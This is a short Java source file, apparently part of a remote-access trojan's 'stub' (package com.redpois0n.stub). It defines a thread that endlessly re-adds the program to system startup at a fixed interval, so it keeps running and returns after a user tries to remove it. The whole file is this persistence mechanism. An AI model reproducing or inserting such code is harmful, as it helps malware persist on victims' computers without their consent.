package com.redpois0n.stub;

public class Persistance extends Thread {

	private int ms;
	
	public Persistance(int ms) {
		super("p");
		this.ms = ms;
	}

	public void run() {
		while (true) {
			try {
				Startup.addToStartup(Main.name);
				
				Thread.sleep(ms);
			} catch (Exception ex) {
				ex.printStackTrace();
				break;
			}
		}
	}

}
